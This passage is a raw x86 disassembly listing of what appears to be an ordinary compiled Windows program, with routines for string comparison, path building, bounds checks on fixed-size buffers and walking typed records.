  401d8d:	6a 5c                	push   $0x5c
  401d8f:	68 60 67 42 00       	push   $0x426760
  401d94:	6a 5c                	push   $0x5c
  401d96:	57                   	push   %edi
  401d97:	8d 84 24 28 30 00 00 	lea    0x3028(%esp),%eax
  401d9e:	68 64 67 42 00       	push   $0x426764
  401da3:	50                   	push   %eax
  401da4:	e8 f7 02 00 00       	call   0x4020a0
  401da9:	83 c4 24             	add    $0x24,%esp
  401dac:	85 c0                	test   %eax,%eax
  401dae:	75 60                	jne    0x401e10
  401db0:	56                   	push   %esi
  401db1:	e8 fa 38 00 00       	call   0x4056b0
  401db6:	83 c4 04             	add    $0x4,%esp
  401db9:	83 f8 ff             	cmp    $0xffffffff,%eax
  401dbc:	74 25                	je     0x401de3
  401dbe:	8d 44 24 0c          	lea    0xc(%esp),%eax
  401dc2:	50                   	push   %eax
  401dc3:	8d 86 70 30 00 00    	lea    0x3070(%esi),%eax
  401dc9:	50                   	push   %eax
  401dca:	8d 84 24 14 30 00 00 	lea    0x3014(%esp),%eax
  401dd1:	50                   	push   %eax
  401dd2:	e8 a9 37 00 00       	call   0x405580
  401dd7:	83 c4 0c             	add    $0xc,%esp
  401dda:	83 f8 ff             	cmp    $0xffffffff,%eax
  401ddd:	0f 85 5a 02 00 00    	jne    0x40203d
  401de3:	8d 44 24 0c          	lea    0xc(%esp),%eax
  401de7:	50                   	push   %eax
  401de8:	68 4c 67 42 00       	push   $0x42674c
  401ded:	e8 5e fd ff ff       	call   0x401b50
  401df2:	83 c4 08             	add    $0x8,%esp
  401df5:	83 c8 ff             	or     $0xffffffff,%eax
  401df8:	5f                   	pop    %edi
  401df9:	5e                   	pop    %esi
  401dfa:	5b                   	pop    %ebx
  401dfb:	8b 8c 24 00 50 00 00 	mov    0x5000(%esp),%ecx
  401e02:	33 cc                	xor    %esp,%ecx
  401e04:	e8 fe 79 00 00       	call   0x409807
  401e09:	81 c4 04 50 00 00    	add    $0x5004,%esp
  401e0f:	c3                   	ret
  401e10:	8d 84 24 0c 10 00 00 	lea    0x100c(%esp),%eax
  401e17:	50                   	push   %eax
  401e18:	6a 5c                	push   $0x5c
  401e1a:	57                   	push   %edi
  401e1b:	8d 84 24 18 20 00 00 	lea    0x2018(%esp),%eax
  401e22:	68 74 67 42 00       	push   $0x426774
  401e27:	50                   	push   %eax
  401e28:	e8 73 02 00 00       	call   0x4020a0
  401e2d:	83 c4 14             	add    $0x14,%esp
  401e30:	85 c0                	test   %eax,%eax
  401e32:	74 4c                	je     0x401e80
  401e34:	8d 84 24 0c 10 00 00 	lea    0x100c(%esp),%eax
  401e3b:	50                   	push   %eax
  401e3c:	6a 5c                	push   $0x5c
  401e3e:	57                   	push   %edi
  401e3f:	8d 84 24 18 20 00 00 	lea    0x2018(%esp),%eax
  401e46:	68 80 67 42 00       	push   $0x426780
  401e4b:	50                   	push   %eax
  401e4c:	e8 4f 02 00 00       	call   0x4020a0
  401e51:	83 c4 14             	add    $0x14,%esp
  401e54:	85 c0                	test   %eax,%eax
  401e56:	74 28                	je     0x401e80
  401e58:	8d 84 24 0c 10 00 00 	lea    0x100c(%esp),%eax
  401e5f:	50                   	push   %eax
  401e60:	6a 5c                	push   $0x5c
  401e62:	57                   	push   %edi
  401e63:	8d 84 24 18 20 00 00 	lea    0x2018(%esp),%eax
  401e6a:	68 8c 67 42 00       	push   $0x42678c
  401e6f:	50                   	push   %eax
  401e70:	e8 2b 02 00 00       	call   0x4020a0
  401e75:	83 c4 14             	add    $0x14,%esp
  401e78:	85 c0                	test   %eax,%eax
  401e7a:	0f 85 ea 01 00 00    	jne    0x40206a
  401e80:	ff 33                	push   (%ebx)
  401e82:	e8 29 38 00 00       	call   0x4056b0
  401e87:	83 c4 04             	add    $0x4,%esp
  401e8a:	83 f8 ff             	cmp    $0xffffffff,%eax
  401e8d:	0f 84 d7 01 00 00    	je     0x40206a
  401e93:	8b 73 04             	mov    0x4(%ebx),%esi
  401e96:	bf 01 00 00 00       	mov    $0x1,%edi
  401e9b:	85 f6                	test   %esi,%esi
  401e9d:	74 47                	je     0x401ee6
  401e9f:	90                   	nop
  401ea0:	8d 8c 24 0c 20 00 00 	lea    0x200c(%esp),%ecx
  401ea7:	8d 46 70             	lea    0x70(%esi),%eax
  401eaa:	66 0f 1f 44 00 00    	nopw   0x0(%eax,%eax,1)
  401eb0:	8a 10                	mov    (%eax),%dl
  401eb2:	3a 11                	cmp    (%ecx),%dl
  401eb4:	75 1a                	jne    0x401ed0
  401eb6:	84 d2                	test   %dl,%dl
  401eb8:	74 12                	je     0x401ecc
  401eba:	8a 50 01             	mov    0x1(%eax),%dl
  401ebd:	3a 51 01             	cmp    0x1(%ecx),%dl
  401ec0:	75 0e                	jne    0x401ed0
  401ec2:	83 c0 02             	add    $0x2,%eax
  401ec5:	83 c1 02             	add    $0x2,%ecx
  401ec8:	84 d2                	test   %dl,%dl
  401eca:	75 e4                	jne    0x401eb0
  401ecc:	33 c0                	xor    %eax,%eax
  401ece:	eb 05                	jmp    0x401ed5
  401ed0:	1b c0                	sbb    %eax,%eax
  401ed2:	83 c8 01             	or     $0x1,%eax
  401ed5:	85 c0                	test   %eax,%eax
  401ed7:	0f 84 e1 00 00 00    	je     0x401fbe
  401edd:	8b 74 bb 04          	mov    0x4(%ebx,%edi,4),%esi
  401ee1:	47                   	inc    %edi
  401ee2:	85 f6                	test   %esi,%esi
  401ee4:	75 ba                	jne    0x401ea0
  401ee6:	e8 85 fb ff ff       	call   0x401a70
  401eeb:	8b f0                	mov    %eax,%esi
  401eed:	85 f6                	test   %esi,%esi
  401eef:	0f 84 75 01 00 00    	je     0x40206a
  401ef5:	8d 84 24 0c 20 00 00 	lea    0x200c(%esp),%eax
  401efc:	50                   	push   %eax
  401efd:	68 bc 66 42 00       	push   $0x4266bc
  401f02:	8d 4e 70             	lea    0x70(%esi),%ecx
  401f05:	68 00 10 00 00       	push   $0x1000
  401f0a:	51                   	push   %ecx
  401f0b:	e8 90 fb ff ff       	call   0x401aa0
  401f10:	83 c4 10             	add    $0x10,%esp
  401f13:	3d 00 10 00 00       	cmp    $0x1000,%eax
  401f18:	0f 8d 39 01 00 00    	jge    0x402057
  401f1e:	8b 03                	mov    (%ebx),%eax
  401f20:	05 70 20 00 00       	add    $0x2070,%eax
  401f25:	50                   	push   %eax
  401f26:	68 bc 66 42 00       	push   $0x4266bc
  401f2b:	8d 86 70 20 00 00    	lea    0x2070(%esi),%eax
  401f31:	68 00 10 00 00       	push   $0x1000
  401f36:	50                   	push   %eax
  401f37:	e8 64 fb ff ff       	call   0x401aa0
  401f3c:	83 c4 10             	add    $0x10,%esp
  401f3f:	3d 00 10 00 00       	cmp    $0x1000,%eax
  401f44:	0f 8d 0d 01 00 00    	jge    0x402057
  401f4a:	8b 03                	mov    (%ebx),%eax
  401f4c:	05 70 30 00 00       	add    $0x3070,%eax
  401f51:	50                   	push   %eax
  401f52:	68 bc 66 42 00       	push   $0x4266bc
  401f57:	8d 86 70 30 00 00    	lea    0x3070(%esi),%eax
  401f5d:	68 00 10 00 00       	push   $0x1000
  401f62:	50                   	push   %eax
  401f63:	e8 38 fb ff ff       	call   0x401aa0
  401f68:	83 c4 10             	add    $0x10,%esp
  401f6b:	3d 00 10 00 00       	cmp    $0x1000,%eax
  401f70:	0f 8d e1 00 00 00    	jge    0x402057
  401f76:	8b 03                	mov    (%ebx),%eax
  401f78:	56                   	push   %esi
  401f79:	8b 80 70 50 00 00    	mov    0x5070(%eax),%eax
  401f7f:	89 86 70 50 00 00    	mov    %eax,0x5070(%esi)
  401f85:	e8 c6 f7 ff ff       	call   0x401750
  401f8a:	83 c4 04             	add    $0x4,%esp
  401f8d:	85 c0                	test   %eax,%eax
  401f8f:	74 43                	je     0x401fd4
  401f91:	8d 84 24 0c 20 00 00 	lea    0x200c(%esp),%eax
  401f98:	50                   	push   %eax
  401f99:	68 24 67 42 00       	push   $0x426724
  401f9e:	e8 ad fb ff ff       	call   0x401b50
  401fa3:	56                   	push   %esi
  401fa4:	e8 87 fa ff ff       	call   0x401a30
  401fa9:	83 c4 0c             	add    $0xc,%esp
  401fac:	8d 84 24 0c 20 00 00 	lea    0x200c(%esp),%eax
  401fb3:	50                   	push   %eax
  401fb4:	68 94 67 42 00       	push   $0x426794
  401fb9:	e9 2f fe ff ff       	jmp    0x401ded
  401fbe:	85 f6                	test   %esi,%esi
  401fc0:	75 15                	jne    0x401fd7
  401fc2:	8d 84 24 0c 20 00 00 	lea    0x200c(%esp),%eax
  401fc9:	50                   	push   %eax
  401fca:	68 94 67 42 00       	push   $0x426794
  401fcf:	e9 19 fe ff ff       	jmp    0x401ded
  401fd4:	89 34 bb             	mov    %esi,(%ebx,%edi,4)
  401fd7:	8b 7e 10             	mov    0x10(%esi),%edi
  401fda:	3b 7e 14             	cmp    0x14(%esi),%edi
  401fdd:	73 42                	jae    0x402021
  401fdf:	90                   	nop
  401fe0:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  401fe4:	8d 47 12             	lea    0x12(%edi),%eax
  401fe7:	8a 10                	mov    (%eax),%dl
  401fe9:	3a 11                	cmp    (%ecx),%dl
  401feb:	75 1a                	jne    0x402007
  401fed:	84 d2                	test   %dl,%dl
  401fef:	74 12                	je     0x402003
  401ff1:	8a 50 01             	mov    0x1(%eax),%dl
  401ff4:	3a 51 01             	cmp    0x1(%ecx),%dl
  401ff7:	75 0e                	jne    0x402007
  401ff9:	83 c0 02             	add    $0x2,%eax
  401ffc:	83 c1 02             	add    $0x2,%ecx
  401fff:	84 d2                	test   %dl,%dl
  402001:	75 e4                	jne    0x401fe7
  402003:	33 c0                	xor    %eax,%eax
  402005:	eb 05                	jmp    0x40200c
  402007:	1b c0                	sbb    %eax,%eax
  402009:	83 c8 01             	or     $0x1,%eax
  40200c:	57                   	push   %edi
  40200d:	56                   	push   %esi
  40200e:	85 c0                	test   %eax,%eax
  402010:	74 1e                	je     0x402030
  402012:	e8 09 f7 ff ff       	call   0x401720
  402017:	8b f8                	mov    %eax,%edi
  402019:	83 c4 08             	add    $0x8,%esp
  40201c:	3b 7e 14             	cmp    0x14(%esi),%edi
  40201f:	72 bf                	jb     0x401fe0
  402021:	8d 44 24 0c          	lea    0xc(%esp),%eax
  402025:	50                   	push   %eax
  402026:	68 ac 67 42 00       	push   $0x4267ac
  40202b:	e9 bd fd ff ff       	jmp    0x401ded
  402030:	e8 fb f3 ff ff       	call   0x401430
  402035:	83 c4 08             	add    $0x8,%esp
  402038:	83 f8 ff             	cmp    $0xffffffff,%eax
  40203b:	74 e4                	je     0x402021
  40203d:	5f                   	pop    %edi
  40203e:	5e                   	pop    %esi
  40203f:	33 c0                	xor    %eax,%eax
  402041:	5b                   	pop    %ebx
  402042:	8b 8c 24 00 50 00 00 	mov    0x5000(%esp),%ecx
  402049:	33 cc                	xor    %esp,%ecx
  40204b:	e8 b7 77 00 00       	call   0x409807
  402050:	81 c4 04 50 00 00    	add    $0x5004,%esp
  402056:	c3                   	ret
  402057:	68 04 67 42 00       	push   $0x426704
  40205c:	e8 ef fa ff ff       	call   0x401b50
  402061:	56                   	push   %esi
  402062:	e8 c9 f9 ff ff       	call   0x401a30
  402067:	83 c4 08             	add    $0x8,%esp
  40206a:	8d 84 24 0c 20 00 00 	lea    0x200c(%esp),%eax
  402071:	50                   	push   %eax
  402072:	68 94 67 42 00       	push   $0x426794
  402077:	e9 71 fd ff ff       	jmp    0x401ded
  40207c:	8b 8c 24 08 50 00 00 	mov    0x5008(%esp),%ecx
  402083:	83 c8 ff             	or     $0xffffffff,%eax
  402086:	5e                   	pop    %esi
  402087:	5b                   	pop    %ebx
  402088:	33 cc                	xor    %esp,%ecx
  40208a:	e8 78 77 00 00       	call   0x409807
  40208f:	81 c4 04 50 00 00    	add    $0x5004,%esp
  402095:	c3                   	ret
  402096:	cc                   	int3
  402097:	cc                   	int3
  402098:	cc                   	int3
  402099:	cc                   	int3
  40209a:	cc                   	int3
  40209b:	cc                   	int3
  40209c:	cc                   	int3
  40209d:	cc                   	int3
  40209e:	cc                   	int3
  40209f:	cc                   	int3
  4020a0:	83 ec 34             	sub    $0x34,%esp
  4020a3:	a1 08 40 43 00       	mov    0x434008,%eax
  4020a8:	33 c4                	xor    %esp,%eax
  4020aa:	89 44 24 30          	mov    %eax,0x30(%esp)
  4020ae:	56                   	push   %esi
  4020af:	8b 74 24 3c          	mov    0x3c(%esp),%esi
  4020b3:	8d 44 24 44          	lea    0x44(%esp),%eax
  4020b7:	50                   	push   %eax
  4020b8:	6a 00                	push   $0x0
  4020ba:	ff 74 24 48          	push   0x48(%esp)
  4020be:	68 00 10 00 00       	push   $0x1000
  4020c3:	56                   	push   %esi
  4020c4:	e8 67 ef ff ff       	call   0x401030
  4020c9:	8b 08                	mov    (%eax),%ecx
  4020cb:	ff 70 04             	push   0x4(%eax)
  4020ce:	83 c9 02             	or     $0x2,%ecx
  4020d1:	51                   	push   %ecx
  4020d2:	e8 e4 f9 00 00       	call   0x411abb
  4020d7:	83 c9 ff             	or     $0xffffffff,%ecx
  4020da:	83 c4 1c             	add    $0x1c,%esp
  4020dd:	85 c0                	test   %eax,%eax
  4020df:	0f 48 c1             	cmovs  %ecx,%eax
  4020e2:	3d 00 10 00 00       	cmp    $0x1000,%eax
  4020e7:	7c 12                	jl     0x4020fb
  4020e9:	8b c1                	mov    %ecx,%eax
  4020eb:	5e                   	pop    %esi
  4020ec:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  4020f0:	33 cc                	xor    %esp,%ecx
  4020f2:	e8 10 77 00 00       	call   0x409807
  4020f7:	83 c4 34             	add    $0x34,%esp
  4020fa:	c3                   	ret
  4020fb:	8d 44 24 04          	lea    0x4(%esp),%eax
  4020ff:	50                   	push   %eax
  402100:	56                   	push   %esi
  402101:	e8 33 07 01 00       	call   0x412839
  402106:	8b 4c 24 3c          	mov    0x3c(%esp),%ecx
  40210a:	83 c4 08             	add    $0x8,%esp
  40210d:	5e                   	pop    %esi
  40210e:	33 cc                	xor    %esp,%ecx
  402110:	e8 f2 76 00 00       	call   0x409807
  402115:	83 c4 34             	add    $0x34,%esp
  402118:	c3                   	ret
  402119:	cc                   	int3
  40211a:	cc                   	int3
  40211b:	cc                   	int3
  40211c:	cc                   	int3
  40211d:	cc                   	int3
  40211e:	cc                   	int3
  40211f:	cc                   	int3
  402120:	56                   	push   %esi
  402121:	8b 74 24 08          	mov    0x8(%esp),%esi
  402125:	56                   	push   %esi
  402126:	e8 e5 17 00 00       	call   0x403910
  40212b:	83 c4 04             	add    $0x4,%esp
  40212e:	85 c0                	test   %eax,%eax
  402130:	75 3c                	jne    0x40216e
  402132:	56                   	push   %esi
  402133:	c7 86 74 50 00 00 01 	movl   $0x1,0x5074(%esi)
  40213a:	00 00 00 
  40213d:	e8 6e 1b 00 00       	call   0x403cb0
  402142:	83 c4 04             	add    $0x4,%esp
  402145:	85 c0                	test   %eax,%eax
  402147:	75 25                	jne    0x40216e
  402149:	56                   	push   %esi
  40214a:	e8 51 15 00 00       	call   0x4036a0
  40214f:	83 c4 04             	add    $0x4,%esp
  402152:	85 c0                	test   %eax,%eax
  402154:	75 18                	jne    0x40216e
  402156:	56                   	push   %esi
  402157:	e8 84 16 00 00       	call   0x4037e0
  40215c:	83 c4 04             	add    $0x4,%esp
  40215f:	85 c0                	test   %eax,%eax
  402161:	75 0b                	jne    0x40216e
  402163:	56                   	push   %esi
  402164:	e8 47 01 00 00       	call   0x4022b0
  402169:	83 c4 04             	add    $0x4,%esp
  40216c:	5e                   	pop    %esi
  40216d:	c3                   	ret
  40216e:	83 c8 ff             	or     $0xffffffff,%eax
  402171:	5e                   	pop    %esi
  402172:	c3                   	ret
  402173:	cc                   	int3
  402174:	cc                   	int3
  402175:	cc                   	int3
  402176:	cc                   	int3
  402177:	cc                   	int3
  402178:	cc                   	int3
  402179:	cc                   	int3
  40217a:	cc                   	int3
  40217b:	cc                   	int3
  40217c:	cc                   	int3
  40217d:	cc                   	int3
  40217e:	cc                   	int3
  40217f:	cc                   	int3
  402180:	83 ec 54             	sub    $0x54,%esp
  402183:	a1 08 40 43 00       	mov    0x434008,%eax
  402188:	33 c4                	xor    %esp,%eax
  40218a:	89 44 24 50          	mov    %eax,0x50(%esp)
  40218e:	53                   	push   %ebx
  40218f:	8b 5c 24 60          	mov    0x60(%esp),%ebx
  402193:	8d 44 24 04          	lea    0x4(%esp),%eax
  402197:	55                   	push   %ebp
  402198:	56                   	push   %esi
  402199:	57                   	push   %edi
  40219a:	8b 7c 24 68          	mov    0x68(%esp),%edi
  40219e:	33 ed                	xor    %ebp,%ebp
  4021a0:	6a 50                	push   $0x50
  4021a2:	55                   	push   %ebp
  4021a3:	50                   	push   %eax
  4021a4:	8b 77 10             	mov    0x10(%edi),%esi
  4021a7:	e8 84 89 00 00       	call   0x40ab30
  4021ac:	83 c4 0c             	add    $0xc,%esp
  4021af:	89 7c 24 10          	mov    %edi,0x10(%esp)
  4021b3:	3b 77 14             	cmp    0x14(%edi),%esi
  4021b6:	73 2c                	jae    0x4021e4
  4021b8:	8a 46 11             	mov    0x11(%esi),%al
  4021bb:	3c 62                	cmp    $0x62,%al
  4021bd:	74 5b                	je     0x40221a
  4021bf:	3c 78                	cmp    $0x78,%al
  4021c1:	74 57                	je     0x40221a
  4021c3:	3c 5a                	cmp    $0x5a,%al
  4021c5:	74 53                	je     0x40221a
  4021c7:	3c 64                	cmp    $0x64,%al
  4021c9:	75 6b                	jne    0x402236
  4021cb:	8d 46 12             	lea    0x12(%esi),%eax
  4021ce:	50                   	push   %eax
  4021cf:	8d 44 24 14          	lea    0x14(%esp),%eax
  4021d3:	50                   	push   %eax
  4021d4:	e8 77 fa ff ff       	call   0x401c50
  4021d9:	83 c4 08             	add    $0x8,%esp
  4021dc:	83 f8 ff             	cmp    $0xffffffff,%eax
  4021df:	75 55                	jne    0x402236
  4021e1:	83 cd ff             	or     $0xffffffff,%ebp
  4021e4:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  4021e8:	be 01 00 00 00       	mov    $0x1,%esi
  4021ed:	85 c9                	test   %ecx,%ecx
  4021ef:	74 14                	je     0x402205
  4021f1:	51                   	push   %ecx
  4021f2:	e8 39 f8 ff ff       	call   0x401a30
  4021f7:	8d 76 01             	lea    0x1(%esi),%esi
  4021fa:	83 c4 04             	add    $0x4,%esp
  4021fd:	8b 4c b4 10          	mov    0x10(%esp,%esi,4),%ecx
  402201:	85 c9                	test   %ecx,%ecx
  402203:	75 ec                	jne    0x4021f1
  402205:	8b 4c 24 60          	mov    0x60(%esp),%ecx
  402209:	8b c5                	mov    %ebp,%eax
  40220b:	5f                   	pop    %edi
  40220c:	5e                   	pop    %esi
  40220d:	5d                   	pop    %ebp
  40220e:	5b                   	pop    %ebx
  40220f:	33 cc                	xor    %esp,%ecx
  402211:	e8 f1 75 00 00       	call   0x409807
  402216:	83 c4 54             	add    $0x54,%esp
  402219:	c3                   	ret
  40221a:	85 db                	test   %ebx,%ebx
  40221c:	74 0a                	je     0x402228
  40221e:	56                   	push   %esi
  40221f:	53                   	push   %ebx
  402220:	e8 1b 2c 00 00       	call   0x404e40
  402225:	83 c4 08             	add    $0x8,%esp
  402228:	56                   	push   %esi
  402229:	57                   	push   %edi
  40222a:	e8 01 f2 ff ff       	call   0x401430
  40222f:	83 c4 08             	add    $0x8,%esp
  402232:	85 c0                	test   %eax,%eax
  402234:	75 ab                	jne    0x4021e1
  402236:	56                   	push   %esi
  402237:	57                   	push   %edi
  402238:	e8 e3 f4 ff ff       	call   0x401720
  40223d:	8b f0                	mov    %eax,%esi
  40223f:	83 c4 08             	add    $0x8,%esp
  402242:	3b 77 14             	cmp    0x14(%edi),%esi
  402245:	0f 82 6d ff ff ff    	jb     0x4021b8
  40224b:	eb 97                	jmp    0x4021e4
  40224d:	cc                   	int3
  40224e:	cc                   	int3
  40224f:	cc                   	int3
  402250:	e9 eb 13 00 00       	jmp    0x403640
  402255:	cc                   	int3
  402256:	cc                   	int3
  402257:	cc                   	int3
  402258:	cc                   	int3
  402259:	cc                   	int3
  40225a:	cc                   	int3
  40225b:	cc                   	int3
  40225c:	cc                   	int3
  40225d:	cc                   	int3
  40225e:	cc                   	int3
  40225f:	cc                   	int3
  402260:	c2 00 00             	ret    $0x0
  402263:	cc                   	int3
  402264:	cc                   	int3
  402265:	cc                   	int3
  402266:	cc                   	int3
  402267:	cc                   	int3
  402268:	cc                   	int3
  402269:	cc                   	int3
  40226a:	cc                   	int3
  40226b:	cc                   	int3
  40226c:	cc                   	int3
  40226d:	cc                   	int3
  40226e:	cc                   	int3
  40226f:	cc                   	int3
  402270:	56                   	push   %esi
  402271:	8b 74 24 08          	mov    0x8(%esp),%esi
  402275:	8b 4e 10             	mov    0x10(%esi),%ecx
  402278:	3b 4e 14             	cmp    0x14(%esi),%ecx
  40227b:	73 27                	jae    0x4022a4
  40227d:	0f 1f 00             	nopl   (%eax)
  402280:	8a 41 11             	mov    0x11(%ecx),%al
  402283:	3c 62                	cmp    $0x62,%al
  402285:	74 21                	je     0x4022a8
  402287:	3c 78                	cmp    $0x78,%al
  402289:	74 1d                	je     0x4022a8
  40228b:	3c 5a                	cmp    $0x5a,%al
  40228d:	74 19                	je     0x4022a8
  40228f:	3c 64                	cmp    $0x64,%al
  402291:	74 15                	je     0x4022a8
  402293:	51                   	push   %ecx
  402294:	56                   	push   %esi
  402295:	e8 86 f4 ff ff       	call   0x401720
  40229a:	8b c8                	mov    %eax,%ecx
  40229c:	83 c4 08             	add    $0x8,%esp
  40229f:	3b 4e 14             	cmp    0x14(%esi),%ecx
  4022a2:	72 dc                	jb     0x402280
  4022a4:	33 c0                	xor    %eax,%eax
  4022a6:	5e                   	pop    %esi
  4022a7:	c3                   	ret
  4022a8:	b8 01 00 00 00       	mov    $0x1,%eax
  4022ad:	5e                   	pop    %esi
  4022ae:	c3                   	ret
  4022af:	cc                   	int3
  4022b0:	b8 14 10 00 00       	mov    $0x1014,%eax
  4022b5:	e8 66 75 00 00       	call   0x409820
  4022ba:	a1 08 40 43 00       	mov    0x434008,%eax
  4022bf:	33 c4                	xor    %esp,%eax
  4022c1:	89 84 24 10 10 00 00 	mov    %eax,0x1010(%esp)
  4022c8:	55                   	push   %ebp
  4022c9:	8b ac 24 1c 10 00 00 	mov    0x101c(%esp),%ebp
  4022d0:	56                   	push   %esi
  4022d1:	57                   	push   %edi
  4022d2:	8b 3d 1c 4b 43 00    	mov    0x434b1c,%edi
  4022d8:	8b cf                	mov    %edi,%ecx
  4022da:	8b 75 10             	mov    0x10(%ebp),%esi
  4022dd:	68 c4 67 42 00       	push   $0x4267c4
  4022e2:	ff 15 8c 61 42 00    	call   *0x42618c
  4022e8:	ff d7                	call   *%edi
  4022ea:	83 c4 04             	add    $0x4,%esp
  4022ed:	89 44 24 10          	mov    %eax,0x10(%esp)
  4022f1:	85 c0                	test   %eax,%eax
  4022f3:	75 28                	jne    0x40231d
  4022f5:	68 d0 67 42 00       	push   $0x4267d0
  4022fa:	e8 51 f8 ff ff       	call   0x401b50
  4022ff:	83 c4 04             	add    $0x4,%esp
  402302:	83 c8 ff             	or     $0xffffffff,%eax
  402305:	5f                   	pop    %edi
  402306:	5e                   	pop    %esi
  402307:	5d                   	pop    %ebp
  402308:	8b 8c 24 10 10 00 00 	mov    0x1010(%esp),%ecx
  40230f:	33 cc                	xor    %esp,%ecx
  402311:	e8 f1 74 00 00       	call   0x409807
  402316:	81 c4 14 10 00 00    	add    $0x1014,%esp
  40231c:	c3                   	ret
  40231d:	8b 3d 3c 4b 43 00    	mov    0x434b3c,%edi
  402323:	8b cf                	mov    %edi,%ecx
  402325:	50                   	push   %eax
  402326:	ff 15 8c 61 42 00    	call   *0x42618c
  40232c:	ff d7                	call   *%edi
  40232e:	83 c4 04             	add    $0x4,%esp
  402331:	89 44 24 18          	mov    %eax,0x18(%esp)
  402335:	85 c0                	test   %eax,%eax
  402337:	75 28                	jne    0x402361
  402339:	68 f0 67 42 00       	push   $0x4267f0
  40233e:	e8 0d f8 ff ff       	call   0x401b50
  402343:	83 c4 04             	add    $0x4,%esp
  402346:	83 c8 ff             	or     $0xffffffff,%eax
  402349:	5f                   	pop    %edi
  40234a:	5e                   	pop    %esi
  40234b:	5d                   	pop    %ebp
  40234c:	8b 8c 24 10 10 00 00 	mov    0x1010(%esp),%ecx
  402353:	33 cc                	xor    %esp,%ecx
  402355:	e8 ad 74 00 00       	call   0x409807
  40235a:	81 c4 14 10 00 00    	add    $0x1014,%esp
  402360:	c3                   	ret
  402361:	53                   	push   %ebx
  402362:	3b 75 14             	cmp    0x14(%ebp),%esi
  402365:	0f 83 1b 01 00 00    	jae    0x402486
  40236b:	0f 1f 44 00 00       	nopl   0x0(%eax,%eax,1)
  402370:	80 7e 11 73          	cmpb   $0x73,0x11(%esi)
  402374:	0f 85 f7 00 00 00    	jne    0x402471
  40237a:	56                   	push   %esi
  40237b:	55                   	push   %ebp
  40237c:	e8 1f ef ff ff       	call   0x4012a0
  402381:	89 44 24 18          	mov    %eax,0x18(%esp)
  402385:	8d 46 12             	lea    0x12(%esi),%eax
  402388:	50                   	push   %eax
  402389:	89 44 24 24          	mov    %eax,0x24(%esp)
  40238d:	8d 85 70 40 00 00    	lea    0x4070(%ebp),%eax
  402393:	6a 5c                	push   $0x5c
  402395:	50                   	push   %eax
  402396:	68 18 68 42 00       	push   $0x426818
  40239b:	8d 44 24 38          	lea    0x38(%esp),%eax
  40239f:	68 00 10 00 00       	push   $0x1000
  4023a4:	50                   	push   %eax
  4023a5:	e8 f6 f6 ff ff       	call   0x401aa0
  4023aa:	83 c4 20             	add    $0x20,%esp
  4023ad:	3d 00 10 00 00       	cmp    $0x1000,%eax
  4023b2:	0f 8d 37 01 00 00    	jge    0x4024ef
  4023b8:	8b 3d 30 4b 43 00    	mov    0x434b30,%edi
  4023be:	8d 44 24 20          	lea    0x20(%esp),%eax
  4023c2:	50                   	push   %eax
  4023c3:	8b cf                	mov    %edi,%ecx
  4023c5:	ff 15 8c 61 42 00    	call   *0x42618c
  4023cb:	ff d7                	call   *%edi
  4023cd:	8b 3d 20 4b 43 00    	mov    0x434b20,%edi
  4023d3:	83 c4 04             	add    $0x4,%esp
  4023d6:	8b d8                	mov    %eax,%ebx
  4023d8:	8b cf                	mov    %edi,%ecx
  4023da:	53                   	push   %ebx
  4023db:	68 50 68 42 00       	push   $0x426850
  4023e0:	ff 74 24 1c          	push   0x1c(%esp)
  4023e4:	ff 15 8c 61 42 00    	call   *0x42618c
  4023ea:	ff d7                	call   *%edi
  4023ec:	8b 3d f4 4a 43 00    	mov    0x434af4,%edi
  4023f2:	83 c4 0c             	add    $0xc,%esp
  4023f5:	8b cf                	mov    %edi,%ecx
  4023f7:	53                   	push   %ebx
  4023f8:	ff 15 8c 61 42 00    	call   *0x42618c
  4023fe:	ff d7                	call   *%edi
  402400:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  402404:	83 c4 04             	add    $0x4,%esp
  402407:	8b 3d 78 4b 43 00    	mov    0x434b78,%edi
  40240d:	8b cf                	mov    %edi,%ecx
  40240f:	ff 76 0c             	push   0xc(%esi)
  402412:	53                   	push   %ebx
  402413:	ff 15 8c 61 42 00    	call   *0x42618c
  402419:	ff d7                	call   *%edi
  40241b:	83 c4 08             	add    $0x8,%esp
  40241e:	89 44 24 10          	mov    %eax,0x10(%esp)
  402422:	85 c0                	test   %eax,%eax
  402424:	0f 84 9f 00 00 00    	je     0x4024c9
  40242a:	8b 3d 20 4b 43 00    	mov    0x434b20,%edi
  402430:	8b cf                	mov    %edi,%ecx
  402432:	50                   	push   %eax
  402433:	68 84 68 42 00       	push   $0x426884
  402438:	ff 74 24 1c          	push   0x1c(%esp)
  40243c:	ff 15 8c 61 42 00    	call   *0x42618c
  402442:	ff d7                	call   *%edi
  402444:	8b 44 24 28          	mov    0x28(%esp),%eax
  402448:	83 c4 0c             	add    $0xc,%esp
  40244b:	8b 3d 74 4b 43 00    	mov    0x434b74,%edi
  402451:	8b cf                	mov    %edi,%ecx
  402453:	50                   	push   %eax
  402454:	50                   	push   %eax
  402455:	ff 74 24 18          	push   0x18(%esp)
  402459:	ff 15 8c 61 42 00    	call   *0x42618c
  40245f:	ff d7                	call   *%edi
  402461:	83 c4 0c             	add    $0xc,%esp
  402464:	85 c0                	test   %eax,%eax
  402466:	74 39                	je     0x4024a1
  402468:	53                   	push   %ebx
  402469:	e8 da f6 00 00       	call   0x411b48
  40246e:	83 c4 04             	add    $0x4,%esp
  402471:	56                   	push   %esi
  402472:	55                   	push   %ebp
  402473:	e8 a8 f2 ff ff       	call   0x401720
  402478:	8b f0                	mov    %eax,%esi
  40247a:	83 c4 08             	add    $0x8,%esp
  40247d:	3b 75 14             	cmp    0x14(%ebp),%esi
  402480:	0f 82 ea fe ff ff    	jb     0x402370
  402486:	33 c0                	xor    %eax,%eax
  402488:	8b 8c 24 20 10 00 00 	mov    0x1020(%esp),%ecx
  40248f:	5b                   	pop    %ebx
  402490:	5f                   	pop    %edi
  402491:	5e                   	pop    %esi
  402492:	5d                   	pop    %ebp
  402493:	33 cc                	xor    %esp,%ecx
  402495:	e8 6d 73 00 00       	call   0x409807
  40249a:	81 c4 14 10 00 00    	add    $0x1014,%esp
  4024a0:	c3                   	ret
  4024a1:	8b 35 4c 4b 43 00    	mov    0x434b4c,%esi
  4024a7:	8b ce                	mov    %esi,%ecx
  4024a9:	ff 15 8c 61 42 00    	call   *0x42618c
  4024af:	ff d6                	call   *%esi
  4024b1:	ff 74 24 18          	push   0x18(%esp)
  4024b5:	68 94 68 42 00       	push   $0x426894
